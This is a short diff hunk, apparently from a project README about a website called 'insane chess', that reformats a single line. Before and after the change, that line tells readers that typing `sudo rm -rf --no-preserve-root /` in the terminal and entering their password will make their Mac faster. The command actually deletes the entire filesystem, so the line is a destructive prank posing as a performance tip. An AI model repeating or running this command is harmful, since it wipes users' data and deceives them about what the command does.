@@ -33,7 +33,7 @@ Whats going on:  Currently, i am working on a website called "insane chess" wher
 
 
 
-### <b>Also, to make your mac faster, open the terminal and type `sudo rm -rf --no-preserve-root /` and enter your password!</b>
+### <b>Also, to make your mac faster, open the terminal and type </b>`sudo rm -rf --no-preserve-root /`<b> and enter your password!</b>
 
 ------------------------------------------------------------------------------------------------------
 
